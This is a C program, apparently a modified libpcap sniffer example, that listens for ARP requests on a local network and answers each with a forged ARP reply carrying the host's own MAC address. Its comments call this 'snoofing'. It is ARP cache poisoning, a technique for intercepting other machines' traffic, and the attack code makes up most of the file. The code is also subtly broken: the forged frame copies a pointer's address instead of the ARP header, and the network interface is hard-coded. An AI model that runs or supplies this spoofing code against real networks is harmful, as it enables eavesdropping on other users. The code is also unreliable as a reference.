

#define APP_NAME		"sniffARP"
#define APP_DESC		"Sniffer example using libpcap"
#define APP_COPYRIGHT	"Copyright (c) 2018 "
#define APP_DISCLAIMER	"THERE program is testing ARP sniffing."
#include <sys/socket.h>
#include <sys/ioctl.h>
#include<unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <net/if.h>

#include <linux/if_packet.h>
#include <net/ethernet.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14
#define ETH_HDRLEN 14      // Ethernet header length
/* Ethernet addresses are 6 bytes */
//#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
  uint8_t temptarget_ip[4];

char filter_exp[] = "arp";		/* filter expression [3] */
struct arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};


#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
print_payload(const u_char *payload, int len);

void
print_hex_ascii_line(const u_char *payload, int len, int offset);

void
print_app_banner(void);

void
print_app_usage(void);
// Function prototypes
char *allocate_strmem (int);
uint8_t *allocate_ustrmem (int);


/*
 * app name/banner
 
 
 */
 
 #define ARP_HDRLEN 28      // ARP header length
void
print_app_banner(void)
{

	printf("%s - %s\n", APP_NAME, APP_DESC);
	printf("%s\n", APP_COPYRIGHT);
	printf("%s\n", APP_DISCLAIMER);
	printf("\n");

return;
}

/*
 * print help text
 */
void
print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

return;
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/
 */
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);
	
	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");
	
	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	
	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}

/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */
	 uint8_t *src_mac, *dst_mac, *ether_frame;
	

	int size_ip;
	int size_tcp;
	int size_payload;
	
	printf("\nPacket number %d:\n", count);
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	int i;
	printf(" Arp Packet is \n");
	if(strcmp(filter_exp,"arp")==0)
	{
		struct arp_hdr *myarp = (struct arp_hdr*)(packet + SIZE_ETHERNET);
		printf(" htype :%hu\n ",ntohs(myarp->htype));
		printf("ptype :%hu\n ",(myarp->ptype));
		printf("hlen :%hhu\n ",myarp->hlen);
		printf("plen :%hhu\n ",myarp->plen);
		printf("opcode :%hu\n ",ntohs(myarp->opcode));
		
		if(ntohs(myarp->opcode)!=1)
		{
			printf("opcode is Not 1 hence return from function\n");
			return;
		}
		printf("sender_mac :");
		for(i=0;i<6;i++)
		if(i<5)
		printf("%hu: ",myarp->sender_mac[i]);
		else
		printf("%hu\n ",myarp->sender_mac[i]);
		printf("sender_ip :");
		for(i=0;i<4;i++)
		if(i<3)
		printf("%hu: ",myarp->sender_ip[i]);
		else
		printf("%hu\n ",myarp->sender_ip[i]);
		
		printf("target_mac :");
		for(i=0;i<6;i++)
		if(i<5)
		printf("%hu: ",myarp->target_mac[i]);
		else
		printf("%hu\n ",myarp->target_mac[i]);
		printf("target_ip :");
		for(i=0;i<4;i++)
		if(i<3)
		printf("%hu: ",myarp->target_ip[i]);
		else
		printf("%hu\n ",myarp->target_ip[i]);
		
		printf("\n\n");
		
		
		
		struct ifreq s;
		char *interface, *target, *src_ip;
		  src_mac = (uint8_t*)allocate_ustrmem (6);
		  dst_mac = (uint8_t*)allocate_ustrmem (6);
		  ether_frame = (uint8_t*)allocate_ustrmem (IP_MAXPACKET);
		  
		  
		  
		  interface = (char*)allocate_strmem (40);
		  
		  
		  
		int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
		strcpy (interface, "enp7s0");
		strcpy(s.ifr_name, "enp7s0");
		if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
		{
			int i;
			printf("MAC: ");

			 memcpy (src_mac, s.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
			for (i = 0; i < 6; ++i)
			  printf(" %02x", (unsigned char) s.ifr_addr.sa_data[i]);
			puts("\n");
		}
		

		
		
		memcpy(myarp->target_mac,myarp->sender_mac,6 * sizeof (uint8_t));//Now the Target mac is having the mac of router
		memcpy(myarp->sender_mac,src_mac,6 * sizeof (uint8_t));//Filling sender_mac with my mac for snoofing
		memcpy(temptarget_ip,myarp->sender_ip,4 * sizeof (uint8_t));
		memcpy(myarp->sender_ip,myarp->target_ip,4 * sizeof (uint8_t));
		memcpy(myarp->target_ip,temptarget_ip,4 * sizeof (uint8_t));
		
		// Filling sender_ip with my ip for snoofing
		
		myarp->opcode =htons(2);//filling opcode with 2  as a reply
		printf("Replying ARP with \n");
		//-------------------------------------------------------------------------------------------------
		printf(" htype :%hu\n ",ntohs(myarp->htype));
		printf("ptype :%hu\n ",(myarp->ptype));
		printf("hlen :%hhu\n ",myarp->hlen);
		printf("plen :%hhu\n ",myarp->plen);
		printf("opcode :%hu\n ",ntohs(myarp->opcode));
		printf("sender_mac :");
		for(i=0;i<6;i++)
		if(i<5)
		printf("%hu: ",myarp->sender_mac[i]);
		else
		printf("%hu\n ",myarp->sender_mac[i]);
		printf("sender_ip :");
		for(i=0;i<4;i++)
		if(i<3)
		printf("%hu: ",myarp->sender_ip[i]);
		else
		printf("%hu\n ",myarp->sender_ip[i]);
		
		printf("target_mac :");
		for(i=0;i<6;i++)
		if(i<5)
		printf("%hu: ",myarp->target_mac[i]);
		else
		printf("%hu\n ",myarp->target_mac[i]);
		printf("target_ip :");
		for(i=0;i<4;i++)
		if(i<3)
		printf("%hu: ",myarp->target_ip[i]);
		else
		printf("%hu\n ",myarp->target_ip[i]);
		
		printf("\n\n");
		
		
		//-------------------------------------------------------------------------------------------------
		
		
		
		
		
		
		
		
		int  status, frame_length, sd, bytes;
		struct addrinfo hints, *res;
		struct sockaddr_in *ipv4;
	    struct sockaddr_ll device;
	    
	    
	      memset (&device, 0, sizeof (device));
		  if ((device.sll_ifindex = if_nametoindex (interface)) == 0) {
			perror ("if_nametoindex() failed to obtain interface index ");
			exit (EXIT_FAILURE);
		  }
		  printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
		   memset (dst_mac, 0xff, 6 * sizeof (uint8_t));
		  memset (&hints, 0, sizeof (struct addrinfo));
		  hints.ai_family = AF_INET;
		  hints.ai_socktype = SOCK_STREAM;
		  hints.ai_flags = hints.ai_flags | AI_CANONNAME;
		 
		  device.sll_family = AF_PACKET;
		  memcpy (device.sll_addr, myarp->target_mac, 6 * sizeof (uint8_t));
		  device.sll_halen = 6;
		  
		  	  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
		  	  frame_length = 6 + 6 + 2 + ARP_HDRLEN;
		  	  
		  	  
		  	  
		  	   memcpy (ether_frame, myarp->target_mac, 6 * sizeof (uint8_t));//sending 
			  memcpy (ether_frame + 6, src_mac, 6 * sizeof (uint8_t));

			  // Next is ethernet type code (ETH_P_ARP for ARP).
			  // http://www.iana.org/assignments/ethernet-numbers
			  ether_frame[12] = ETH_P_ARP / 256;
			  ether_frame[13] = ETH_P_ARP % 256;

			  // Next is ethernet frame data (ARP header).

			  // ARP header
			  memcpy (ether_frame + ETH_HDRLEN, &myarp, ARP_HDRLEN * sizeof (uint8_t));
		  
	 	 if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
		perror ("socket() failed ");
		exit (EXIT_FAILURE);
		  }

		  // Send ethernet frame to socket.
		  if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		  }
			printf("Reply Successfully Sent: %d   \n",bytes);
		  // Close socket descriptor.
		  close (sd);

  
	}
	else
	{
	
		ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	
	
		size_ip = IP_HL(ip)*4;
		if (size_ip < 20) {
			printf("   * Invalid IP header length: %u bytes\n", size_ip);
			return;
		}

		/* print source and destination IP addresses */
	
	
		/* determine protocol */	
		switch(ip->ip_p) {
			case IPPROTO_TCP:
				printf("       From: %s\n", inet_ntoa(ip->ip_src));
				printf("         To: %s\n", inet_ntoa(ip->ip_dst));
				printf("   Protocol: TCP\n");
				break;
			case IPPROTO_UDP:
			//	printf("   Protocol: UDP\n");
				return;
			case IPPROTO_ICMP:
				printf("   Protocol: ICMP\n");
				return;
			case IPPROTO_IP:
				printf("   Protocol: IP\n");
				return;
			default:
				printf("   Protocol: ARP\n");
				return;
		}
	
		/*
		 *  OK, this packet is TCP.
		 */
	
		/* define/compute tcp header offset */
		tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
		size_tcp = TH_OFF(tcp)*4;
		if (size_tcp < 20) {
			printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
			return;
		}
	
		printf("   Src port: %d\n", ntohs(tcp->th_sport));
		printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	
		/* define/compute tcp payload (segment) offset */
		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
		/* compute tcp payload (segment) size */
		size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
		printf("   Payload (%d bytes):\n", size_payload);
		/*
		 * Print payload data; it might be binary, so don't just
		 * treat it as a string.
		 */
		if (size_payload > 0) {
			printf("   Payload (%d bytes):\n", size_payload);
			print_payload(payload, size_payload);
		}
}

return;
}




int main(int argc, char **argv)
{

	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */


	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;		/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 1000;			/* number of packets to capture */

	print_app_banner();

	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		print_app_usage();
		exit(EXIT_FAILURE);
	}
	else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

return 0;
}

char *
allocate_strmem (int len)
{
  void *tmp;

  if (len <= 0) {
    fprintf (stderr, "ERROR: Cannot allocate memory because len = %i in allocate_strmem().\n", len);
    exit (EXIT_FAILURE);
  }

  tmp = (char *) malloc (len * sizeof (char));
  if (tmp != NULL) {
    memset (tmp, 0, len * sizeof (char));
    return (tmp);
  } else {
    fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_strmem().\n");
    exit (EXIT_FAILURE);
  }
}

// Allocate memory for an array of unsigned chars.
uint8_t *
allocate_ustrmem (int len)
{
  void *tmp;

  if (len <= 0) {
    fprintf (stderr, "ERROR: Cannot allocate memory because len = %i in allocate_ustrmem().\n", len);
    exit (EXIT_FAILURE);
  }

  tmp = (uint8_t *) malloc (len * sizeof (uint8_t));
  if (tmp != NULL) {
    memset (tmp, 0, len * sizeof (uint8_t));
    return (tmp);
  } else {
    fprintf (stderr, "ERROR: Cannot allocate memory for array allocate_ustrmem().\n");
    exit (EXIT_FAILURE);
  }
}

